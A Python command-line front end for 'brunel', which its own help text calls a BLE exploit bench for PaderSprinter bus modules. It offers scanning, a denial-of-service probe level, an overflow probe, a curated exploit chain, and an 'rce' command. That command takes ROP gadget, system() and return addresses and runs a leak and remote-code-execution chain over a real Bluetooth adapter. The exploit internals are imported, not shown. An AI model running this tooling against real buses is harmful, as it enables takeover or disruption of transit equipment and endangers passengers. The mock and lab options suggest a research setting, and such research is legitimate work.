# command line entry point

from __future__ import annotations

import argparse
import asyncio
import json
import os
import shutil
import sys
from pathlib import Path

from . import __version__, protocol
from .bench import Bench, Level, REGISTRY
from .report import render
from .rce import RCE, RCEConfig
from .store import SessionMeta, Store, load_session, utc_now
from .transport import BumbleTransport, Transport

DEFAULT_OUT = Path("research/sessions")


def _transport(args: argparse.Namespace) -> Transport:
    if args.mock:
        from .mock import MockTransport

        return MockTransport()
    if getattr(args, "transport", "").startswith("emu:"):
        from .emulator import EmulatorTransport

        _, _, port = args.transport.partition(":")
        return EmulatorTransport(port=int(port or 9100))
    return BumbleTransport(args.transport, args.name)


async def _open(transport: Transport) -> None:
    if hasattr(transport, "open"):
        await transport.open()


def cmd_doctor(args: argparse.Namespace) -> int:
    checks = {
        "python": sys.version.split()[0],
        "bumble": _module_version("bumble"),
        "bluetoothctl": shutil.which("bluetoothctl"),
        "btmon": shutil.which("btmon"),
        "vhci": Path("/dev/vhci").exists(),
        "docker": shutil.which("docker"),
        "adapter": _adapter(),
    }
    for name, value in checks.items():
        print(f"{name:14} {value}")
    return 0


def _module_version(name: str) -> str | None:
    try:
        module = __import__(name)
        return getattr(module, "__version__", "installed")
    except Exception:
        return None


def _adapter() -> str | None:
    try:
        import subprocess

        output = subprocess.run(["bluetoothctl", "show"], capture_output=True, text=True, timeout=5).stdout
        for line in output.splitlines():
            if line.strip().startswith("Controller"):
                return line.strip()
    except Exception:
        return None
    return None


async def _scan(args: argparse.Namespace) -> int:
    transport = _transport(args)
    await _open(transport)
    seen: dict[str, int] = {}

    def on_ad(ad) -> None:
        if ad.candidate is None:
            return
        decoded = ad.decoded
        seen[ad.address] = seen.get(ad.address, 0) + 1
        print(
            f"{ad.address} rssi={ad.rssi:4d} {protocol.summarize(decoded)} "
            f"name={ad.name!r} tags={protocol.fingerprint(ad.address, ad.name, None, decoded)['tags']}"
        )

    await transport.start_scan(on_ad)
    try:
        await asyncio.sleep(args.seconds)
    finally:
        await transport.stop_scan()
        await transport.close()
    print(f"{len(seen)} bus addresses, {sum(seen.values())} advertisements")
    return 0


async def _bench(args: argparse.Namespace) -> int:
    out = Path(args.out)
    out.mkdir(parents=True, exist_ok=True)
    transport = _transport(args)
    await _open(transport)
    store = Store(
        out,
        meta=SessionMeta(
            sessionId="",
            startedUtc=utc_now(),
            level=args.level,
            device=args.name,
            scan=args.transport if not args.mock else "mock",
        ),
    )
    bench = Bench(
        transport,
        store,
        level=Level.parse(args.level),
        scan_seconds=args.scan_seconds,
        settle=args.settle,
        recovery=args.recovery,
        probe_ids=args.probes.split(",") if args.probes else None,
        max_targets=args.max_targets,
    )
    try:
        await bench.run()
    finally:
        await transport.close()
        summary = bench.summary()
        store.bench_summary(summary)
        store.close()
    report_path = out / store.session_id / "report.html"
    render(out / store.session_id, report_path)
    print(json.dumps(summary["by_status"], indent=2))
    print(f"session {out / store.session_id}")
    print(f"report  {report_path}")
    return 0


async def _rce(args: argparse.Namespace) -> int:
    transport = _transport(args)
    await _open(transport)
    config = RCEConfig(
        address=args.address,
        profile=args.profile,
        command=args.cmd,
        offset=args.offset,
        offsets=[int(value, 0) for value in args.offsets.split(",")] if args.offsets else [],
        size=args.size,
        system=args.system,
        gadget=args.gadget,
        command_addr=args.command_addr,
        shadow=args.shadow,
        return_addr=args.return_addr,
        align_ret=args.align_ret,
        leak_length=args.leak_length,
        scan_seconds=args.scan_seconds,
        settle=args.settle,
        recovery=args.recovery,
        action_handle=args.action_handle,
        write_mode=args.write_mode,
        mtu=args.mtu,
        gadget_words=args.gadget_words,
        gadget_lr=args.gadget_lr,
        system_thumb=args.system_thumb,
        hello=args.hello,
        ladder=args.ladder,
        leak=not args.no_leak,
        dry_run=args.dry_run,
    )
    exploit = RCE(transport, config)
    try:
        await exploit.run()
    finally:
        await transport.close()
    summary = exploit.summary()
    print(json.dumps(summary, indent=2))
    if args.out:
        Path(args.out).write_text(json.dumps(summary, indent=2) + "\n")
    return 0


def cmd_replay(args: argparse.Namespace) -> int:
    path = Path(args.path)
    files = [path] if path.is_file() else sorted(path.rglob("events.jsonl"))
    total = 0
    decoded = 0
    failed = 0
    lines = 0
    for file in files:
        for line in file.read_text().splitlines():
            if not line.strip():
                continue
            event = json.loads(line)
            if event.get("type") != "advertisement":
                continue
            total += 1
            raw = bytes.fromhex(event["data"]["bytes"])
            result = protocol.decode_bus(protocol.parse_structures(raw))
            if result.ok:
                decoded += 1
                if args.verbose:
                    print(f"{event['data']['address']} {protocol.summarize(result)}")
            else:
                failed += 1
            lines += 1
    print(f"{lines} advertisements, {decoded} decoded, {failed} failed")
    return 0


def cmd_chain(args: argparse.Namespace) -> int:
    args.level = "dos"
    args.probes = "fingerprint,route_read,gatt_enum,eir_overflow,post_inventory"
    args.scan_seconds = args.scan_seconds
    args.settle = 1.5
    args.recovery = 20
    args.max_targets = 1
    return asyncio.run(_bench(args))


def cmd_report(args: argparse.Namespace) -> int:
    session = Path(args.session)
    output = Path(args.out) if args.out else session / "report.html"
    render(session, output)
    print(output)
    return 0


def cmd_probes(args: argparse.Namespace) -> int:
    for spec in sorted(REGISTRY, key=lambda p: (p.level, p.id)):
        print(f"{spec.level.name:8} {spec.id:28} {spec.cve or '':16} {spec.title}")
    return 0


def cmd_lab(args: argparse.Namespace) -> int:
    root = Path(__file__).resolve().parents[2] / "lab"
    if args.action == "up":
        print(f"cd {root} && docker compose up --build")
    elif args.action == "down":
        print(f"cd {root} && docker compose down")
    elif args.action == "repro":
        print(f"{root}/scripts/repro.sh {args.name or 'all'}")
    else:
        print(f"lab at {root}")
        for path in sorted(root.rglob("*")):
            if path.is_file():
                print(path.relative_to(root))
    return 0


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(prog="brunel", description="BLE exploit bench for PaderSprinter bus modules")
    parser.add_argument("--version", action="version", version=__version__)
    sub = parser.add_subparsers(dest="command", required=True)

    doctor = sub.add_parser("doctor", help="check the host")
    doctor.set_defaults(func=cmd_doctor)

    scan = sub.add_parser("scan", help="passive scan and decode")
    scan.add_argument("--seconds", type=float, default=15)
    scan.add_argument("--transport", default="usb:0")
    scan.add_argument("--name", default="BrunelBench")
    scan.add_argument("--mock", action="store_true")
    scan.set_defaults(func=lambda a: asyncio.run(_scan(a)))

    bench = sub.add_parser("bench", help="run the probe bench")
    bench.add_argument("--level", default="read", choices=[level.name.lower() for level in Level])
    bench.add_argument("--scan-seconds", type=float, default=12)
    bench.add_argument("--settle", type=float, default=1.5)
    bench.add_argument("--recovery", type=float, default=20)
    bench.add_argument("--probes", default="")
    bench.add_argument("--max-targets", type=int, default=8)
    bench.add_argument("--transport", default="usb:0")
    bench.add_argument("--name", default="BrunelBench")
    bench.add_argument("--out", default=str(DEFAULT_OUT))
    bench.add_argument("--mock", action="store_true")
    bench.set_defaults(func=lambda a: asyncio.run(_bench(a)))

    rce = sub.add_parser("rce", help="run the leak and action RCE stages")
    rce.add_argument("--address")
    rce.add_argument("--profile", default="armv7", choices=["armv7", "aarch64", "x86_64"])
    rce.add_argument("--cmd", default="id")
    rce.add_argument("--offset", type=int, default=256)
    rce.add_argument("--offsets", default="")
    rce.add_argument("--size", type=int, default=512)
    rce.add_argument("--system", type=lambda value: int(value, 0))
    rce.add_argument("--gadget", type=lambda value: int(value, 0))
    rce.add_argument("--command-addr", type=lambda value: int(value, 0))
    rce.add_argument("--shadow", type=lambda value: int(value, 0), help="address of the mirror copy (action_shadow)")
    rce.add_argument("--return-addr", type=lambda value: int(value, 0))
    rce.add_argument("--align-ret", type=lambda value: int(value, 0))
    rce.add_argument("--leak-length", type=int, default=253)
    rce.add_argument("--scan-seconds", type=float, default=20)
    rce.add_argument("--settle", type=float, default=1.5)
    rce.add_argument("--recovery", type=float, default=25)
    rce.add_argument("--action-handle", type=lambda value: int(value, 0))
    rce.add_argument("--write-mode", default="auto", choices=["auto", "command", "prepare"])
    rce.add_argument("--mtu", type=int, default=517)
    rce.add_argument("--gadget-words", type=int, default=2)
    rce.add_argument("--gadget-lr", type=lambda value: int(value, 0), help="pop {r0, r4, lr}; bx r4")
    rce.add_argument("--system-thumb", action="store_true", help="system() is Thumb code")
    rce.add_argument("--hello", action="store_true", help="send a 1-byte stop request first")
    rce.add_argument("--ladder", action="store_true", help="find the crash length before the chain")
    rce.add_argument("--no-leak", action="store_true", help="skip the EIR/leak stage")
    rce.add_argument("--dry-run", action="store_true")
    rce.add_argument("--transport", default="usb:0")
    rce.add_argument("--name", default="BrunelRCE")
    rce.add_argument("--out")
    rce.add_argument("--mock", action="store_true")
    rce.set_defaults(func=lambda a: asyncio.run(_rce(a)))

    replay = sub.add_parser("replay", help="replay captured advertisements through the decoder")
    replay.add_argument("path")
    replay.add_argument("--verbose", action="store_true")
    replay.set_defaults(func=cmd_replay)

    chain = sub.add_parser("chain", help="run the curated exploit chain")
    chain.add_argument("--scan-seconds", type=float, default=20)
    chain.add_argument("--transport", default="usb:0")
    chain.add_argument("--name", default="BrunelChain")
    chain.add_argument("--out", default=str(DEFAULT_OUT))
    chain.add_argument("--mock", action="store_true")
    chain.set_defaults(func=cmd_chain)

    report = sub.add_parser("report", help="render a session report")
    report.add_argument("session")
    report.add_argument("--out")
    report.set_defaults(func=cmd_report)

    probes = sub.add_parser("probes", help="list probes")
    probes.set_defaults(func=cmd_probes)

    lab = sub.add_parser("lab", help="lab helper")
    lab.add_argument("action", nargs="?", default="list", choices=["list", "up", "down", "repro"])
    lab.add_argument("name", nargs="?")
    lab.set_defaults(func=cmd_lab)
    return parser


def main(argv: list[str] | None = None) -> None:
    parser = build_parser()
    args = parser.parse_args(argv)
    os.makedirs(DEFAULT_OUT, exist_ok=True)
    raise SystemExit(args.func(args))
